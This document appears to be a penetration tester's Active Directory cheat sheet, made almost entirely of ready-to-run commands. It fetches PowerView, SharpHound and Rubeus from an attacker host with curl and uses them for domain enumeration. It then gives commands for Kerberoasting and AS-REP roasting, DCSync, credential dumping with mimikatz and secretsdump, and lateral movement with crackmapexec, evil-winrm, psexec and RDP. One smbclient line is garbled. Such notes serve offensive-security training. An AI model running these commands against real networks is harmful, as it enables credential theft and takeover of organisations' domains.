Active Directory

## Enumeration
PowerView.ps1, SharpHound.ps1,
Rubeus.exe

powershell -ep bypass


curl.exe http://192.168.45.206/SharpHound.ps1 -o SharpHound.ps1
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

curl.exe http://192.168.45.206/PowerView.ps1 -o PowerView.ps1
Import-Module .\PowerView.ps1
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
Find-LocalAdminAccess
Find-DomainShare
Get-NetUser -SPN | select samaccountname,serviceprincipalname



## Attacks AD
curl.exe http://192.168.45.206/Rubeus.exe -o Rubeus.exe
.\Rubeus.exe asreproast /outfile:asreproast.hash /format:hashcat /domain:$DOMAIN
.\Rubeus.exe kerberoast /outfile:kerberoast.hash /format:hashcat
impacket-GetNPUsers -request -dc-ip $DC $DOMAIN/$USER:$PASS -outputfile asreproast.hash -format hashcat
impacket-GetUserSPNs -request -dc-ip $DC $DOMAIN/$USER:$PASS -outputfile kerberoast.hash

mimikatz # lsadump::dcsync
impacket-secretsdump

$password = ConvertTo-SecureString "P@ssw0rd!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred

crackmapexec smb $IP -u $USER -p $PASS --local-auth
crackmapexec smb $IP -u $USER -p $PASS -d $DOMAIN --shares

impacket-smbclient -hashes 32'0:$NTLM $DOMAIN/$USER@$IP
evil-winrm -i $IP -u $USER -p $PASS
impacket-psexec $DOMAIN/$USER:$PASS@$IP
impacket-mssqlclient $DOMAIN/$USER:$PASS@$IP -windows-auth
xfreerdp /u:$USER /p:$PASS /v:$IP /d:$DOMAIN /cert-ignore
rdesktop -i $IP -u $USER -p $PASS

mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
sekurlsa::logonpasswords
impacket-secretsdump $DOMAIN/$USER@$IP -hashes :$NTLM -outputfile secrets
